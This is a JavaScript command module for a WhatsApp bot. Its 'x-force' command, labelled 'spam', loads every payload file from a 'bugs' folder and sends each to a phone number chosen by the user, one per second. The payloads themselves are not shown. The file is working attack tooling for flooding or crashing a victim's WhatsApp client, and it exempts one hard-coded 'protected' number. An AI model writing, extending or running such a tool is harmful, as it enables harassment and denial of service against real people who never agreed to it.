const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');

cmd({
  pattern: 'x-force',
  desc: 'Send all text payloads from /bugs/x-force folder to a target number',
  category: 'spam',
  react: '⚡',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'x-force') return;

    const args = body.trim().split(/\s+/).slice(1);
    const targetNumber = args[0];

    if (!targetNumber || isNaN(targetNumber)) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}x-force <number>`
      }, { quoted: mek });
    }

    const protectedNumbers = ['13058962443'];
    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected. Command aborted.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;
    const bugsDir = path.join(__dirname, '../bugs/x-force');
    if (!fs.existsSync(bugsDir)) {
      return await bot.sendMessage(from, { text: '📁 The folder /bugs/x-force does not exist.' }, { quoted: mek });
    }
    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));

    if (bugFiles.length === 0) {
      return await bot.sendMessage(from, { text: '📁 No payloads found in /bugs/x-force.' }, { quoted: mek });
    }

    await bot.sendMessage(from, {
      text: `🚀 Sending ${bugFiles.length} payloads from /bugs/x-force to number: +${targetNumber}`
    }, { quoted: mek });

    for (const file of bugFiles) {
      try {
        const payloadPath = path.join(bugsDir, file);
        let bugPayload = require(payloadPath);

        // If it's an object with default string export
        if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
          const msg = bugPayload.default;
          await bot.sendMessage(targetJid, { text: msg });
        }
        // If it's a plain string export
        else if (typeof bugPayload === 'string') {
          await bot.sendMessage(targetJid, { text: bugPayload });
        }
        // If it's an async function export
        else if (typeof bugPayload === 'function') {
          await bugPayload(bot, targetNumber);
        }
        else {
          await bot.sendMessage(targetJid, { text: `Payload in ${file} is in an unrecognized format.` });
        }

      } catch (e) {
        console.error(`❌ Error sending ${file}:`, e.message);
        await bot.sendMessage(targetJid, { text: `❌ Error sending ${file}: ${e.message}` });
      }

      await new Promise(res => setTimeout(res, 1000)); // 1 second delay between each message (adjustable)
    }

    await bot.sendMessage(from, {
      text: `✅ Finished sending all payloads in /bugs/x-force to +${targetNumber}`
    }, { quoted: mek });

  } catch (err) {
    console.error(err);
    reply(`❌ Error: ${err.message}`);
  }
});
